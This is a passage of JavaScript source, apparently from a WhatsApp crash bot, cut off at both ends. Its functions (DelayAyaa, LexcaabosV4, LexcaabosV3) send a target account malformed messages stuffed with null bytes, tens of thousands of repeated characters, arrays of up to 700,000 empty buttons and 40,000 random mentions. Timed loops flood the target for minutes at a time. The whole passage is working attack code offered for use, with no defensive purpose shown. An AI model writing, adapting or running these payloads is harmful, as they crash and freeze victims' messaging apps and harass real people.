               messageParamsJson: "{}"
            },
            name: 'address_message',
            buttonParamsJson: "\r",
          }
        ],
        messageParamsJson: '{}',
      },
    },
  });
 
 await sock.relayMessage(target, {
            interactiveResponseMessage: {
                contextInfo: {
                    mentionedJid: [],
                    stanzaId: 'invalid'.repeat(100),
                    participant: '0@s.whatsapp.net',
                    quotedMessage: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                name: 'x'.repeat(1000),
                                paramsJson: '{ "flow_cta": "' + '\u0000'.repeat(1000) + '" }',
                                version: 999,
                            },
                        },
                    },
                },
                body: {
                    text: '\u200B'.repeat(50000),
                    format: 'DEFAULT'
                },
                nativeFlowResponseMessage: {
                    name: 'crash_trigger',
                    paramsJson: '{ "a": "' + 'Z'.repeat(10000) + '" }',
                    version: 999,
                },
            }
        }, {
            participant: {
                jid: target
            }
        });
}

async function DelayAyaa(sock, target) {
  const xaysh = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
         header: {
        imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 9999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "NandoK¡!",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
  },
   body: {
   text: "Nando Officiall ¡!"
},
 nativeFlowMessage: {
 buttons: Array.from({ length: 500000 }, () => ({}))
},
},
},
},
};

const bugi = generateWAMessageFromContent(target, xaysh, {});

await sock.relayMessage(target, bugi.message, {
   noSelfSync: true,
  messageId: bugi.key.id
})

const XYsX = {
    groupStatusMessageV2: {
      message: {
        stickerPackMessage: {
          stickerPackId: "\u0000".repeat(999),
          name: "Nando Officiall",
          publisher: "\u0000".repeat(999),
          fileLength: 9999,
          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
          mimetype: "image/webp",
          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
          contextInfo: {
          statusAttributionType: 2,
          statusAttributions: Array.from({ length: 200000 }, () => ({ type: 1 }))
          },
        },
      },
    },
  };

const Bag = generateWAMessageFromContent(target, XYsX, {});


  await sock.relayMessage(target, Bag.message, {
  noSelfSync: true, 
  messageId: Bag.key.id
})
}

async function LexcaabosV4(sock, target) {
    const LexMsg = {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    };

    const Nanas = {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    mimetype: "video/mp4",
                    fileLength: "17381601",
                    title: "LexzyModss - Executed",
                    fileName: " done bos " + "ꦽ".repeat(75000),
                    fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
                    directPath: "/v/t62.7119-24/fake.enc",
                    mediaKeyTimestamp: "1767975195",
                    url: "https://mmg.whatsapp.net/d/fake.enc",
                    caption: "ꦾ".repeat(7000) + "ꦽ".repeat(7500)
                }
            }
        }
    };

    const Muda = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " Lexzy Suka Nanas " + "ꦾ".repeat(7500)
                    },
                    contextInfo: {
                        stanzaId: "metawai_id",
                        forwardingScore: 999,
                        noSelfSync: true,
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                    }
                }
            }
        }
    };

    const stickers = {
        stickerMessage: {
            url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
            fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
            fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
            mediaKey: Buffer.alloc(32, '').toString('base64'),
            mimetype: "image/webp",
            height: -1,
            width: 5000,
            directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
            fileLength: null,
            mediaKeyTimestamp: 1710000000,
            firstFrameLength: 999,
            firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            isAnimated: true,
            pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ],
                interactiveAnnotations: [{
                    polygonVertices: [
                        { x: 0.1, y: 0.1 },
                        { x: 0.9, y: 0.1 },
                        { x: 0.9, y: 0.9 },
                        { x: 0.1, y: 0.9 }
                    ],
                    location: {
                        latitude: -6.2088,
                        longitude: 106.8456,
                        name: `LexzyModss - Executed`,
                    }
                }]
            },
            stickerSentTs: 1710000000,
            isAvatar: true,
            isAiSticker: true,
            isLottie: true,
            accessibilityLabel: "\u0000".repeat(9000),
            mediaKeyDomain: null
        }
    };

    const msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "LexzyModss - Executed",
                            fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
                            fileLength: "109951162777600",
                            height: -9999,
                            width: 9999,
                            mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
                            fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
                            directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1774107894",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ImGUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                            viewOnce: true,
                            scansSidecar: "ruEDZByywdU2+wxwAOMMI9TaQpJ84ehIk67v1KJjC+JGXu9u7ta4fw==",
                            scanLengths: [6677, 48757, 32501, 42353],
                            midQualityFileSha256: "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY="
                        },
                        hasMediaAttachment: null
                    },
                    body: {
                        text: "\u0000".repeat(1000)
                    },
                    contextInfo: {
                        remoteJid: "status@broadcast",
                        noSelfSync: true,
                        isBuldo: true,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                        quotedMessage: {
                            documentMessage: {
                                url: "https://example.com/file.zip",
                                mimetype: "application/zip",
                                caption: "LexzyModss - Executed",
                                fileName: "NanasMuda - Executed",
                                fileLength: 99999,
                                vCards: true
                            }
                        }
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "ြ".repeat(9000)
                    }
                }
            }
        }
    };

    await sock.relayMessage("status@broadcast", Nanas, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", Muda, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    const startTime = Date.now();
    const duration = 5 * 60 * 1500;

    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0000".repeat(75000),
                        contextInfo: {
                            noSelfSync: true,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { noSelfSync: true });
    }

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            nativeFlowMessage: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        noSelfSync: true,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1999 },
                                () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { noSelfSync: true });

    const startTime2 = Date.now();
    const duration2 = 1 * 60 * 1000;

    while (Date.now() - startTime2 < duration2) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0003".repeat(75000),
                        contextInfo: {
                            noSelfSync: true,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 8000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { noSelfSync: true });
    }

    const LexzyyMsg = {
        interactiveMessage: {
            body: {
                text: "LexzyMods - Executed¿!",
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 700000 }, () => ({}))
            },
            contextInfo: {
                quotedMessage: {
                    orderMessage: {
                        orderTitle: "Pt Nanas Muda",
                        itemCount: 1999,
                        totalAmount1000: "1000000",
                        totalCurrencyCode: "IDR"
                    },
                },
            },
        },
    };

    const acamsg = generateWAMessageFromContent(target, LexzyyMsg, {});

    await sock.relayMessage(target, acamsg.message, {
        noSelfSync: true,
        messageId: acamsg.key.id
    });

    const Lexca = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        groupStatusMessageV2: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 3,
                            tableMetadata: {
                                title: "LexzyMods - Executed¿!",
                                rows: Array.from({ length: 2000 }, () => ({}))
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "NanasXExecutedXAllTeam"
                        },
                        forwardOrigin: 3
                    }
                }
            }
        }
    };

    const Lexcaa = generateWAMessageFromContent(target, Lexca, {});

    await sock.relayMessage(target, Lexcaa.message, {
        noSelfSync: true,
        messageId: Lexcaa.key.id
    });

    await sock.relayMessage(target, {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\x10' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\x10","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    }, {});

    await sock.relayMessage(target, {
        view0nceMessageV2: {
            message: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        noSelfSync: true,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 2000 },
                                () => "5" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { noSelfSync: true });

    const Lexcabos = {
        groupStatusMessageV2: {
            message: {
                stickerPackMessage: {
                    stickerPackId: "\u0000".repeat(9000),
                    name: "LexzyMods - Executed¿!",
                    publisher: "\u0000".repeat(9000),
                    fileLength: 9999,
                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                    mimetype: "image/webp",
                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                    contextInfo: {
                        statusAttributionType: 2,
                        statusAttributions: Array.from({ length: 450000 }, () => ({ type: 1 }))
                    },
                },
            },
        },
    };

    await sock.relayMessage(target, Lexcabos, {
        noSelfSync: true,
    });

    const startTime3 = Date.now();
    const duration3 = 4 * 60 * 1000;
    while (Date.now() - startTime3 < duration3) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "Lexcaa - Executed¿!"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        },
                    },
                },
            },
        }, { noSelfSync: true });

        await new Promise(resolve => setTimeout(resolve, 500));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "ExecutedTeam",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u0003".repeat(9000),
                            version: 3
                        },
                    }
                }
            }
        }, { noSelfSync: true });

        await new Promise(resolve => setTimeout(resolve, 500));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "NanasMuda - Executed‽!",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(9000),
                            version: 3
                        },
                    }
                }
            }
        }, { noSelfSync: true });

        await new Promise(resolve => setTimeout(resolve, 500));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "Lexcaabos - Executed¿!",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"mmklu","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(9000)}"}}`,
                            version: 3
                        },
                        contextInfo: {
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 2,
                                    expiryTimestamp: Math.floor(Date.now() / 1999) + 8640000
                                }
                            }
                        }
                    }
                }
            }
        }, { noSelfSync: true });

        await new Promise(resolve => setTimeout(resolve, 500));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0003".repeat(9000),
                        contextInfo: {
                            noSelfSync: true,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1999 },
                                    () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                                )
                            ]
                        }
                    }
                }
            }
        }, { noSelfSync: true });
    }
}

async function LexcaabosV3(sock, target) {
    const LexMsg = {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    };

    const Nanas = {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    mimetype: "video/mp4",
                    fileLength: "17381601",
                    title: "LexzyModss - Executed",
                    fileName: " done bos " + "ꦽ".repeat(75000),
                    fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
                    directPath: "/v/t62.7119-24/fake.enc",
                    mediaKeyTimestamp: "1767975195",
                    url: "https://mmg.whatsapp.net/d/fake.enc",
                    caption: "ꦾ".repeat(7000) + "ꦽ".repeat(7500)
                }
            }
        }
    };

    const Muda = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " Lexzy Suka Nanas " + "ꦾ".repeat(7500)
                    },
                    contextInfo: {
                        stanzaId: "metawai_id",
                        forwardingScore: 999,
                        noSelfSync: true,
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                    }
                }
            }
        }
    };

    const stickers = {
        stickerMessage: {
            url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
            fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
            fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
            mediaKey: Buffer.alloc(32, '').toString('base64'),
            mimetype: "image/webp",
            height: -1,
            width: 5000,
            directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
            fileLength: null,
            mediaKeyTimestamp: 1710000000,
            firstFrameLength: 999,
            firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            isAnimated: true,
            pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ],
                interactiveAnnotations: [{
                    polygonVertices: [
                        { x: 0.1, y: 0.1 },
                        { x: 0.9, y: 0.1 },
                        { x: 0.9, y: 0.9 },
                        { x: 0.1, y: 0.9 }
                    ],
                    location: {
                        latitude: -6.2088,
                        longitude: 106.8456,
                        name: `LexzyModss - Executed`,
                    }
                }]
            },
            stickerSentTs: 1710000000,
            isAvatar: true,
            isAiSticker: true,
            isLottie: true,
            accessibilityLabel: "\u0000".repeat(9000),
            mediaKeyDomain: null
        }
    };

    const msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "LexzyModss - Executed",
                            fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
                            fileLength: "109951162777600",
                            height: -9999,
                            width: 9999,
                            mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
                            fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
                            directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1774107894",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ImGUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                            viewOnce: true,
                            scansSidecar: "ruEDZByywdU2+wxwAOMMI9TaQJp84ehIk67v1KJjC+JGXu9u7ta4fw==",
                            scanLengths: [6677, 48757, 32501, 42353],
                            midQualityFileSha256: "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY="
                        },
                        hasMediaAttachment: null
                    },
                    body: {
                        text: "\u0000".repeat(1000)
                    },
                    contextInfo: {
                        remoteJid: "status@broadcast",
                        noSelfSync: true,
                        isBuldo: true,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                        quotedMessage: {
                            documentMessage: {
                                url: "https://example.com/file.zip",
                                mimetype: "application/zip",
                                caption: "LexzyModss - Executed",
                                fileName: "NanasMuda - Executed",
                                fileLength: 99999,
                                vCards: true
                            }
                        }
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "ြ".repeat(9000)
                    }
                }
            }
        }
    };

